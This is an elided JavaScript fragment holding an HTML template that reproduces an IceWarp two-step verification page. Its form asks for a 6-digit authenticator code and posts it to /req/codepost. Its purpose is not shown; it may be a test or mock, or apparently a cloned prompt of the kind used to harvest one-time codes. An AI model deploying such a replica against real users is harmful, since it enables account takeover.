    ...
    const htmlContent = `
            ...
            <body dir="ltr">
                ...
                <main class="o-external__main">
                    <form class="o-card c-card templates-card" data-hook="form" action="/req/codepost" accept-charset="UTF-8"  method="POST" data-component="templates-card-2">
                    <div class="o-card__main">
                        ...
                        <section data-component="organisms-card-section-11" class=" o-card__section   ">
                            ...
                            <main class="o-header__main">
                                ...
                                <div data-component="atoms-well-3" data-hook="well" class=" o-well  o-well--secondary   is-visible  o-header__well   ">
                                ...
                                <div class="o-well__content">
                                    <p class="o-well__text u-bold">Two step verification</p>
                                    <p class="o-well__text">Please enter 6 digit code from IceWarp Authenticator app</p>
                                </div>
                                </div>
                            </main>
                            </div>
                        ...
                        <section data-component="organisms-card-section-13" class=" o-card__section  o-card__section--form   ">
                            ...
                            <input data-component="atoms-element-input-7" class=" o-form__element" type="number" required="" name="totpcode" autocomplete="off" maxlength="6" data-hook="totpcode">
